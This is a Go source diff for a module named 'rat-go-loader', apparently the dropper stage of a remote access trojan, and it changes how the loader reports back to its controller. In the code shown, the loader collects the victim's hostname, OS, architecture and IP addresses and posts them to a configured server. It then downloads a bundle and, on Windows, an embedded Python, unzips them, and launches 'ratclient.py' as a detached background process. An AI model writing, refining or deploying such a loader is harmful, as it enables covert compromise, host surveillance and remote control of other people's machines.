@@ -18,30 +18,6 @@ import (
 	"rat-go-loader/config"
 )
 
-type LoaderReport struct {
-	Event        string   `json:"event"`
-	Time         string   `json:"time,omitempty"`
-	LoaderBuild  string   `json:"loader_build_version,omitempty"`
-	OS           string   `json:"os,omitempty"`
-	Arch         string   `json:"arch,omitempty"`
-	Hostname     string   `json:"hostname,omitempty"`
-	IPs          []string `json:"ips,omitempty"`
-	PythonFound  bool     `json:"python_found,omitempty"`
-	PythonBinary string   `json:"python_binary,omitempty"`
-	PythonVer    string   `json:"python_version,omitempty"`
-	WorkDir      string   `json:"work_dir,omitempty"`
-	BuildVersion string   `json:"build_version,omitempty"`
-	DownloadURL  string   `json:"download_url,omitempty"`
-	ArchivePath  string   `json:"archive_path,omitempty"`
-	ExtractPath  string   `json:"extract_path,omitempty"`
-	LaunchScript string   `json:"launch_script,omitempty"`
-	StdoutPath   string   `json:"stdout_path,omitempty"`
-	StderrPath   string   `json:"stderr_path,omitempty"`
-	PID          int      `json:"pid,omitempty"`
-	Message      string   `json:"message,omitempty"`
-	Error        string   `json:"error,omitempty"`
-}
-
 type BundleBuildResponse struct {
 	Code    int    `json:"code"`
 	Message string `json:"message"`
@@ -51,6 +27,9 @@ type BundleBuildResponse struct {
 		BuildVersion string `json:"build_version"`
 	} `json:"data"`
 }
+
+// firstReportDone 标记是否已完成首次主机信息上报
+var firstReportDone = false
 
 func debugLogPath() string {
 	return filepath.Join(os.TempDir(), "go_loader_debug.log")
@@ -81,51 +60,46 @@ func main() {
 	))
 
 	host, _ := os.Hostname()
-	baseReport := LoaderReport{
-		Time:        time.Now().Format(time.RFC3339),
-		LoaderBuild: config.LoaderBuildVersion,
-		OS:          runtime.GOOS,
-		Arch:        runtime.GOARCH,
-		Hostname:    host,
-		IPs:         getLocalIPs(),
-	}
+	ips := getLocalIPs()
 
+	// 首次上报：携带完整的主机信息
 	appendDebugLog("report startup begin: " + reportURL())
-	_ = report("startup", mergeReport(baseReport, LoaderReport{
-		Message: fmt.Sprintf(
-			"loader started, report_url=%s, build_url=%s, socket_target=%s:%d",
-			reportURL(),
-			buildURL(config.BundleBuildAPIPath),
-			config.ServerSocketHost,
-			config.ServerSocketPort,
-		),
-	}))
+	_ = report("START", fmt.Sprintf(
+		"loader started ver=%s os=%s arch=%s hostname=%s ips=%s report_to=%s build_from=%s socket_target=%s:%d",
+		config.LoaderBuildVersion,
+		runtime.GOOS,
+		runtime.GOARCH,
+		host,
+		strings.Join(ips, ","),
+		reportURL(),
+		buildURL(config.BundleBuildAPIPath),
+		config.ServerSocketHost,
+		config.ServerSocketPort,
+	))
+
+	firstReportDone = true
 
 	var pythonBinary string
-	var pythonVersion string
 	var ok bool
 
 	// Windows 系统：使用嵌入版 Python，不进行本地勘测
 	if runtime.GOOS == "windows" {
 		appendDebugLog("windows detected, using embedded python")
-		pythonBinary, ok = setupEmbeddedPython(baseReport)
+		pythonBinary, ok = setupEmbeddedPython()
 		if !ok {
 			appendDebugLog("embedded python setup failed, exiting")
 			return
 		}
-		pythonVersion = "embedded"
 	} else {
-		// Unix 系统：保持原有逻辑，检测本地 Python
+		// Unix 系统：检测本地 Python
 		appendDebugLog("python check begin")
+		var pythonVersion string
 		pythonBinary, pythonVersion, ok = detectPython()
 		appendDebugLog(fmt.Sprintf("python check result: found=%v binary=%s version=%s", ok, pythonBinary, pythonVersion))
-		_ = report("python_check", mergeReport(baseReport, LoaderReport{
-			PythonFound:  ok,
-			PythonBinary: pythonBinary,
-			PythonVer:    pythonVersion,
-			Message:      "python environment checked",
-		}))
-		if !ok {
+		if ok {
+			_ = report("PYTHON_OK", fmt.Sprintf("found %s (%s)", pythonBinary, pythonVersion))
+		} else {
+			_ = report("PYTHON_ERR", "python not found")
 			appendDebugLog("python not found, exiting")
 			return
 		}
@@ -135,24 +109,17 @@ func main() {
 	workDir, err := resolveWorkDir()
 	if err != nil {
 		appendDebugLog("resolve workdir error: " + err.Error())
-		_ = report("workdir_error", mergeReport(baseReport, LoaderReport{
-			Error: err.Error(),
-		}))
+		_ = report("WORKDIR_ERR", "resolve workdir failed: "+err.Error())
 		return
 	}
 	appendDebugLog("resolve workdir ok: " + workDir)
-	_ = report("workdir_ready", mergeReport(baseReport, LoaderReport{
-		WorkDir: workDir,
-	}))
+	_ = report("WORKDIR_OK", workDir)
 
 	appendDebugLog("request bundle build begin: " + buildURL(config.BundleBuildAPIPath))
 	buildMeta, err := requestBundleBuild()
 	if err != nil {
 		appendDebugLog("request bundle build error: " + err.Error())
-		_ = report("bundle_build_error", mergeReport(baseReport, LoaderReport{
-			WorkDir: workDir,
-			Error:   err.Error(),
-		}))
+		_ = report("BUILD_ERR", "request bundle build failed: "+err.Error())
 		return
 	}
 	appendDebugLog(fmt.Sprintf(
@@ -161,6 +128,7 @@ func main() {
 		buildMeta.Data.DownloadURL,
 		buildMeta.Data.BuildVersion,
 	))
+	_ = report("BUILD_OK", fmt.Sprintf("version=%s file=%s", buildMeta.Data.BuildVersion, buildMeta.Data.FileName))
 
 	archivePath := filepath.Join(workDir, buildMeta.Data.FileName)
 	extractPath := filepath.Join(workDir, buildMeta.Data.BuildVersion)
@@ -169,41 +137,27 @@ func main() {
 	appendDebugLog("download bundle begin: " + downloadURL)
 	if err := downloadFile(downloadURL, archivePath); err != nil {
 		appendDebugLog("download bundle error: " + err.Error())
-		_ = report("bundle_download_error", mergeReport(baseReport, LoaderReport{
-			WorkDir:      workDir,
-			BuildVersion: buildMeta.Data.BuildVersion,
-			DownloadURL:  downloadURL,
-			ArchivePath:  archivePath,
-			Error:        err.Error(),
-		}))
+		_ = report("DOWNLOAD_ERR", "download bundle failed: "+err.Error())
 		return
 	}
 	appendDebugLog("download bundle ok: " + archivePath)
+	_ = report("DOWNLOAD_OK", fmt.Sprintf("downloaded to %s", archivePath))
 
 	appendDebugLog("prepare extract dir: " + extractPath)
 	if err := os.RemoveAll(extractPath); err != nil && !os.IsNotExist(err) {
 		appendDebugLog("prepare extract dir error: " + err.Error())
-		_ = report("extract_prepare_error", mergeReport(baseReport, LoaderReport{
-			WorkDir:     workDir,
-			ExtractPath: extractPath,
-			Error:       err.Error(),
-		}))
+		_ = report("EXTRACT_ERR", "prepare extract dir failed: "+err.Error())
 		return
 	}
 
 	appendDebugLog("extract bundle begin")
 	if err := unzipArchive(archivePath, extractPath); err != nil {
 		appendDebugLog("extract bundle error: " + err.Error())
-		_ = report("bundle_extract_error", mergeReport(baseReport, LoaderReport{
-			WorkDir:      workDir,
-			BuildVersion: buildMeta.Data.BuildVersion,
-			ArchivePath:  archivePath,
-			ExtractPath:  extractPath,
-			Error:        err.Error(),
-		}))
+		_ = report("EXTRACT_ERR", "extract bundle failed: "+err.Error())
 		return
 	}
 	appendDebugLog("extract bundle ok: " + extractPath)
+	_ = report("EXTRACT_OK", fmt.Sprintf("extracted to %s", extractPath))
 
 	launchScript := filepath.Join(extractPath, "ratclient.py")
 	appendDebugLog("prepare python command begin: " + launchScript)
@@ -211,11 +165,7 @@ func main() {
 	cmd, usedPython, stdoutPath, stderrPath, err := buildPythonCommand(pythonBinary, launchScript, extractPath)
 	if err != nil {
 		appendDebugLog("prepare python command error: " + err.Error())
-		_ = report("launch_prepare_error", mergeReport(baseReport, LoaderReport{
-			ExtractPath:  extractPath,
-			LaunchScript: launchScript,
-			Error:        err.Error(),
-		}))
+		_ = report("LAUNCH_ERR", "prepare python command failed: "+err.Error())
 		return
 	}
 	appendDebugLog(fmt.Sprintf(
@@ -227,46 +177,30 @@ func main() {
 	proc, err := startDetached(cmd, extractPath)
 	if err != nil {
 		appendDebugLog("start detached process error: " + err.Error())
-		_ = report("launch_error", mergeReport(baseReport, LoaderReport{
-			ExtractPath:  extractPath,
-			LaunchScript: launchScript,
-			StdoutPath:   stdoutPath,
-			StderrPath:   stderrPath,
-			Error:        err.Error(),
-		}))
+		_ = report("LAUNCH_ERR", "start detached process failed: "+err.Error())
 		return
 	}
 	appendDebugLog(fmt.Sprintf("start detached process ok: pid=%d", proc.Pid))
 
-	_ = report("launch_success", mergeReport(baseReport, LoaderReport{
-		PythonFound:  true,
-		PythonBinary: usedPython,
-		PythonVer:    pythonVersion,
-		WorkDir:      workDir,
-		BuildVersion: buildMeta.Data.BuildVersion,
-		DownloadURL:  downloadURL,
-		ArchivePath:  archivePath,
-		ExtractPath:  extractPath,
-		LaunchScript: launchScript,
-		StdoutPath:   stdoutPath,
-		StderrPath:   stderrPath,
-		PID:          proc.Pid,
-		Message:      "bundle launched successfully",
-	}))
+	_ = report("LAUNCH_OK", fmt.Sprintf(
+		"pid=%d python=%s script=%s workdir=%s version=%s stdout=%s stderr=%s",
+		proc.Pid,
+		usedPython,
+		launchScript,
+		extractPath,
+		buildMeta.Data.BuildVersion,
+		stdoutPath,
+		stderrPath,
+	))
 	appendDebugLog("loader finished successfully and will exit")
 }
 
 // setupEmbeddedPython 为 Windows 系统设置嵌入版 Python
-// 检查缓存，如不存在则下载并解压，返回 python.exe 路径
-func setupEmbeddedPython(baseReport LoaderReport) (string, bool) {
-	// 获取工作目录用于缓存
+func setupEmbeddedPython() (string, bool) {
 	home, err := os.UserHomeDir()
 	if err != nil {
 		appendDebugLog("get home dir error: " + err.Error())
-		_ = report("python_setup_error", mergeReport(baseReport, LoaderReport{
-			Error:   fmt.Sprintf("get home dir: %s", err.Error()),
-			Message: "embedded python setup failed",
-		}))
+		_ = report("PYTHON_ERR", "get home dir failed: "+err.Error())
 		return "", false
 	}
 
@@ -276,18 +210,12 @@ func setupEmbeddedPython(baseReport LoaderReport) (string, bool) {
 	// 检查缓存是否存在
 	if _, err := os.Stat(pythonExe); err == nil {
 		appendDebugLog("embedded python cache exists: " + pythonExe)
-		_ = report("python_setup", mergeReport(baseReport, LoaderReport{
-			PythonFound:  true,
-			PythonBinary: pythonExe,
-			PythonVer:    "embedded-cached",
-			Message:      "using cached embedded python",
-		}))
+		_ = report("PYTHON_OK", fmt.Sprintf("using cached embedded python: %s", pythonExe))
 		return pythonExe, true
 	}
 
 	appendDebugLog("embedded python cache not found, downloading...")
 
-	// 构建下载 URL
 	downloadURL := fmt.Sprintf("%s://%s:%d/api/external-tools/python-embed/download?platform=win&arch=%s",
 		config.ServerWebScheme,
 		config.ServerWebHost,
@@ -295,97 +223,50 @@ func setupEmbeddedPython(baseReport LoaderReport) (string, bool) {
 		runtime.GOARCH,
 	)
 
-	// 下载 Python 嵌入版压缩包
 	zipPath := filepath.Join(pythonDir, "python-embed.zip")
 	if err := os.MkdirAll(pythonDir, 0o755); err != nil {
 		appendDebugLog("create python embed dir error: " + err.Error())
-		_ = report("python_setup_error", mergeReport(baseReport, LoaderReport{
-			DownloadURL: downloadURL,
-			Error:       fmt.Sprintf("create dir: %s", err.Error()),
-			Message:     "embedded python setup failed",
-		}))
+		_ = report("PYTHON_ERR", "create python embed dir failed: "+err.Error())
 		return "", false
 	}
 
 	appendDebugLog("downloading embedded python from: " + downloadURL)
 	if err := downloadFile(downloadURL, zipPath); err != nil {
 		appendDebugLog("download embedded python error: " + err.Error())
-		_ = report("python_setup_error", mergeReport(baseReport, LoaderReport{
-			DownloadURL: downloadURL,
-			ArchivePath: zipPath,
-			Error:       fmt.Sprintf("download: %s", err.Error()),
-			Message:     "embedded python download failed",
-		}))
+		_ = report("PYTHON_ERR", "download embedded python failed: "+err.Error())
 		return "", false
 	}
 	appendDebugLog("embedded python downloaded: " + zipPath)
 
-	// 解压
 	appendDebugLog("extracting embedded python to: " + pythonDir)
 	if err := unzipArchive(zipPath, pythonDir); err != nil {
 		appendDebugLog("extract embedded python error: " + err.Error())
-		_ = report("python_setup_error", mergeReport(baseReport, LoaderReport{
-			DownloadURL: downloadURL,
-			ArchivePath: zipPath,
-			ExtractPath: pythonDir,
-			Error:       fmt.Sprintf("extract: %s", err.Error()),
-			Message:     "embedded python extract failed",
-		}))
+		_ = report("PYTHON_ERR", "extract embedded python failed: "+err.Error())
 		return "", false
 	}
 	appendDebugLog("embedded python extracted successfully")
 
-	// 验证 python.exe 存在
 	if _, err := os.Stat(pythonExe); err != nil {
 		appendDebugLog("python.exe not found after extract: " + err.Error())
-		_ = report("python_setup_error", mergeReport(baseReport, LoaderReport{
-			DownloadURL: downloadURL,
-			ArchivePath: zipPath,
-			ExtractPath: pythonDir,
-			Error:       fmt.Sprintf("python.exe not found: %s", err.Error()),
-			Message:     "embedded python verification failed",
-		}))
+		_ = report("PYTHON_ERR", "python.exe not found after extract: "+err.Error())
 		return "", false
 	}
 
 	appendDebugLog("embedded python ready: " + pythonExe)
-	_ = report("python_setup", mergeReport(baseReport, LoaderReport{
-		PythonFound:  true,
-		PythonBinary: pythonExe,
-		PythonVer:    "embedded-downloaded",
-		DownloadURL:  downloadURL,
-		ArchivePath:  zipPath,
-		ExtractPath:  pythonDir,
-		Message:      "embedded python downloaded and cached",
-	}))
+	_ = report("PYTHON_OK", fmt.Sprintf("embedded python downloaded and cached: %s", pythonExe))
 
 	return pythonExe, true
 }
 
-func mergeReport(base LoaderReport, extra LoaderReport) LoaderReport {
-	if extra.Time == "" {
-		extra.Time = time.Now().Format(time.RFC3339)
-	}
-	if extra.LoaderBuild == "" {
-		extra.LoaderBuild = base.LoaderBuild
-	}
-	if extra.OS == "" {
-		extra.OS = base.OS
-	}
-	if extra.Arch == "" {
-		extra.Arch = base.Arch
-	}
-	if extra.Hostname == "" {
-		extra.Hostname = base.Hostname
-	}
-	if len(extra.IPs) == 0 {
-		extra.IPs = base.IPs
-	}
-	return extra
-}
+// report 发送纯文本日志行到服务端
+// 格式：时间 | 事件标签 | 消息
+// 服务端直接追加到日志文件
+func report(event string, message string) error {
+	now := time.Now().Format("2006-01-02 15:04:05")  // 改这一行
+	line := fmt.Sprintf("%s | %-12s | %s", now, event, message)
 
-func report(event string, payload LoaderReport) error {
-	payload.Event = event
+	// 封装成 JSON 发给服务端，服务端取 line 字段写入
+	payload := map[string]string{"line": line}
 	body, _ := json.Marshal(payload)
 
 	req, err := http.NewRequest(http.MethodPost, reportURL(), bytes.NewReader(body))
@@ -658,7 +539,6 @@ func buildPythonCommand(preferredPython string, scriptPath string, extractPath s
 
 	var lastErr error
 	for _, name := range candidates {
-		// 对于嵌入版 Python（绝对路径），直接检查文件是否存在
 		var lookErr error
 		if filepath.IsAbs(name) {
 			if _, err := os.Stat(name); err != nil {
